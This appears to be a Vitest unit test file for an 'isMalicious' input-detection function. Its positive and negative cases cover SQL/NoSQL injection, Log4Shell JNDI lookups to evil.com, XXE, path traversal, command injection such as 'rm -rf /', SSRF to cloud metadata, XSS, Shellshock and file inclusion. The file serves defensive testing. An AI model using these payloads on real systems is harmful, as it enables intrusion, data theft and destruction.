import {describe, expect, it} from 'vitest';
import {isMalicious} from '../fingerprint.js';

// We import the function directly to test it in isolation, avoiding vite:define errors.

describe('isMalicious Unit Tests', () => {

    describe('SQL and NoSQL Injections', () => {
        it.each([
            ["' OR '1'='1'"],
            ["' or '1'='1' --"],
            ["UNION SELECT username, password FROM users"],
            ["; DROP TABLE products;--"],
            ["SLEEP(5)"],
            ["BENCHMARK(10000,MD5('a'))"],
            ["WAITFOR DELAY '0:0:5'"],
            ['{"$ne": null}'],
        ])('should detect malicious SQL/NoSQL pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal comment -- for a blog post."],
            ["Please select your union representative."],
            ["The price is not equal to $10."],
            ["My favorite song is 'Stairway to Heaven'."],
        ])('should NOT detect legitimate string: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Log4Shell (JNDI Injection)', () => {
        it.each([
            ["${jndi:ldap://evil.com/a}"],
            ["${jndi:rmi://evil.com/a}"],
            ["${jndi:dns://evil.com/a}"],
            ["${JNDI:LDAP://evil.com/a}"], // Case-insensitive
        ])('should detect Log4Shell pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["The variable is ${user.name}"],
            ["This is a normal log message."],
        ])('should NOT detect legitimate log message: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Server-Side Template Injection (SSTI)', () => {
        it.each([
            ["{{ 7*7 }}"],
            ["{% if user.isAdmin %}{% endif %}"],
            ["Hello {{user.name}}"], // Potentially risky
        ])('should detect SSTI pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal string with {curly braces}"],
            ["(100%)"],
        ])('should NOT detect legitimate string with braces: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('XML External Entity (XXE)', () => {
        it.each([
            ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
            ['<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">'],
        ])('should detect XXE pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["<!DOCTYPE html>"],
            ["<note><to>Tove</to></note>"],
        ])('should NOT detect legitimate XML/HTML: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Path Traversal', () => {
        it.each([
            ["../../../../etc/passwd"],
            ["..\\..\\..\\..\\windows\\system32\\config.sam"],
        ])('should detect Path Traversal pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["path/to/a/legitimate/file.txt"],
            ["Just two dots.. not a traversal."],
        ])('should NOT detect legitimate path: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Command Injection', () => {
        it.each([
            ["/path/to/script.sh; ls -la "],
            ["127.0.0.1 && whoami "],
            ["`reboot`"],
            ["filename.txt\ncat /etc/passwd "],
            [" | rm -rf /"], // Pipe before a dangerous command
        ])('should detect Command Injection pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal command like ls -la /tmp"],
            ["Use the pipe | for output redirection."],
        ])('should NOT detect legitimate command-like string: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false); // This will fail with the old regex
        });
    });

    describe('Server-Side Request Forgery (SSRF)', () => {
        it.each([
            ["http://127.0.0.1/admin"],
            ["https://localhost:8080"],
            ["http://169.254.169.254/latest/meta-data/"],
            ["http://[::1]/"],
        ])('should detect SSRF pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["https://google.com"],
            ["https://github.com/login"],
        ])('should NOT detect legitimate external URL: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('CRLF Injection', () => {
        it.each([
            ["malicious\r\nSet-Cookie: session=evil"],
            ["%0d%0aSet-Cookie: session=evil"],
        ])('should detect CRLF pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["normal text without carriage returns"],
        ])('should NOT detect normal text: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Cross-Site Scripting (XSS)', () => {
        it.each([
            ["<script>alert(1)</script>"],
            ["javascript:alert(1)"],
            ["<img src=x onerror=alert(1)>"],
            ["<iframe src=javascript:alert(1)>"],
        ])('should detect XSS pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["This is a normal paragraph with some <b>bold</b> text."],
        ])('should NOT detect clean HTML/text: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Open Redirect', () => {
        it.each([
            ["https://evil.com"],
            ["http://malicious-site.org/redirect"],
            ["//attacker.com"],
        ])('should detect Open Redirect pattern: %s', (payload) => {
            expect(isMalicious(payload, ['openRedirect'])).toBe(true);
        });

        it.each([
            ["/local/path/to/page"],
            ["http://localhost/dashboard"],
            ["http://127.0.0.1:3000/profile"],
        ])('should NOT detect local redirect path: %s', (payload) => {
            expect(isMalicious(payload, ['openRedirect'])).toBe(false);
        });
    });

    describe('Local/Remote File Inclusion (LFI/RFI)', () => {
        it.each([
            ["etc/passwd"],
            ["win.ini"],
            ["php://filter/read=convert.base64-encode/resource=index.php"],
            ["data://text/plain;base64,SSBsb3ZlIFBIUAo="],
        ])('should detect LFI/RFI pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["/var/www/html/index.php"],
            ["My computer runs windows, yours runs linux."],
        ])('should NOT detect normal filenames or terms: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Shellshock (CVE-2014-6271)', () => {
        it.each([
            ["() { :; }; echo 'Vulnerable'"],
            ["() { :;}; /bin/bash"],
        ])('should detect Shellshock pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["function test() { echo 'Not Shellshock'; }"],
        ])('should NOT detect normal functions: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('NoSQL MongoDB Operator Injection', () => {
        it.each([
            ["$gt"],
            ["$elemMatch"],
            ["$where"],
        ])('should detect NoSQL pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["This costs $100 dollars"],
            ["No operators here"],
        ])('should NOT detect normal dollar signs: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });
});